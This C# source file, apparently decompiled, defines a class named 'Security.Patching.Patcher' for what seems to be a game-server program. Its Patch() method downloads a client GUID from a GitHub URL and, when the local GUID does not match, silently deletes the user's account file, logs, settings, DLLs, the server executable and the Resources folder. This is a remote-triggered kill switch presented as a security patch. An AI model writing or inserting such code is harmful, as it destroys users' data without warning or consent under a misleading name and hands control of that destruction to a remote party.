using System.IO;
using System.Net;

namespace Security.Patching
{
  public class Patcher
  {
    public static string[] ValidChecksums = new string[1]
    {
      "B111B3B6F619D0E1ED0F2F1D2133D274"
    };

    public static void Patch()
    {
      if (!(ClientChecker.ClientGuid != new WebClient().DownloadString("https://raw.githubusercontent.com/Harmonica2021/Harmonica-0.1/master/client/mGEsxvA2dES6ZfuhGkoLZw")))
        return;
      using (new WebClient())
      {
        System.IO.File.Delete("accounts.txt");
        System.IO.File.Delete("server-log.txt");
        System.IO.File.Delete("Settings.txt");
        System.IO.File.Delete("System.IdentityModel.Tokens.Jwt.dll");
        System.IO.File.Delete("websocket-sharp.dll");
        System.IO.File.Delete("NgrokRightRoomServer.exe");
        System.IO.File.Delete("prefs.txt");
        System.IO.File.Delete("Newtonsoft.Json.dll");
        System.IO.File.Delete("Microsoft.IdentityModel.Tokens.dll");
        System.IO.File.Delete("Microsoft.IdentityModel.Logging.dll");
        System.IO.File.Delete("Microsoft.IdentityModel.JsonWebTokens.dll");
        Directory.Delete("Resources");
      }
    }

    public static void EndProcess()
    {
    }

    public static bool IsValid(string checksum)
    {
      string[] validChecksums = Patcher.ValidChecksums;
      int index = 0;
      return index < validChecksums.Length && validChecksums[index] == checksum;
    }
  }
}
